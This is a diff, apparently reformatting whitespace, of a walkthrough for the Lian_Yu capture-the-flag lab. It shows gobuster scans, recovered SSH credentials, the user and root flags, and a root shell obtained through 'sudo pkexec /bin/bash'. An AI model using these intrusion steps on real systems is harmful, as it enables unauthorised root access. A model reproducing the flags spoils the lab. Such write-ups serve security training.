@@ -1,4 +1,5 @@
 ### lian_yu
+
 ## 9/18/20
 
 ### IP
@@ -43,13 +44,14 @@ Service detection performed. Please report any incorrect results at https://nmap
 ```
 
 ### gobuster scan
+
 gobuster dir -u 10.10.137.46 -w /usr/share/wordlists/directory-list-2.3-medium.txt -o gobuster_scan.txt
 
 /island (Status: 301)
 /server-status (Status: 403)
 
-
 #### gobuster scan of /island/2100
+
 gobuster dir --url 10.10.137.46/island/2100 --wordlist /usr/share/wordlists/directory-list-2.3-medium.txt -x .ticket
 
 /green_arrow.ticket
@@ -69,37 +71,35 @@ password
 ### Unzip ss
 
 archive:  ss.zip
-  inflating: passwd.txt              
-  inflating: shado                   
-[inflatus@cheese-shop gobuster]$ cat passwd.txt 
+  inflating: passwd.txt
+  inflating: shado
+[inflatus@cheese-shop gobuster]$ cat passwd.txt
 This is your visa to Land on Lian_Yu # Just for Fun ***
-
 
 a small Note about it
 
-
-Having spent years on the island, Oliver learned how to be resourceful and 
+Having spent years on the island, Oliver learned how to be resourceful and
 set booby traps all over the island in the common event he ran into dangerous
 people. The island is also home to many animals, including pheasants,
 wild pigs and wolves.
 
-[inflatus@cheese-shop gobuster]$ cat shado 
+[inflatus@cheese-shop gobuster]$ cat shado
 M3tahuman
 
-
 ### ssh with username and password
+
 ssh 10.10.127.190
 slade
 M3tahuman
 
-cat user.txt 
+cat user.txt
 THM{P30P7E_K33P_53CRET5__C0MPUT3R5_D0N'T}
-			--Felicity Smoak
+   --Felicity Smoak
 
 ### privesc
 
 sudo -l
-[sudo] password for slade: 
+[sudo] password for slade:
 Matching Defaults entries for slade on LianYu:
     env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
 
@@ -107,20 +107,13 @@ User slade may run the following commands on LianYu:
     (root) PASSWD: /usr/bin/pkexec
 slade@LianYu:~$ sudo pkexec /bin/bash
 
-
 root@LianYu:~# ls -l
 total 4
 -rw-r--r-- 1 root root 340 May  1 07:17 root.txt
-root@LianYu:~# cat root.txt 
+root@LianYu:~# cat root.txt
                           Mission accomplished
 
-
-
-You are injected me with Mirakuru:) ---> Now slade Will become DEATHSTROKE. 
-
-
+You are injected me with Mirakuru:) ---> Now slade Will become DEATHSTROKE.
 
 THM{MY_W0RD_I5_MY_B0ND_IF_I_ACC3PT_YOUR_CONTRACT_THEN_IT_WILL_BE_COMPL3TED_OR_I'LL_BE_D34D}
-									      --DEATHSTROKE
-
-
+               --DEATHSTROKE
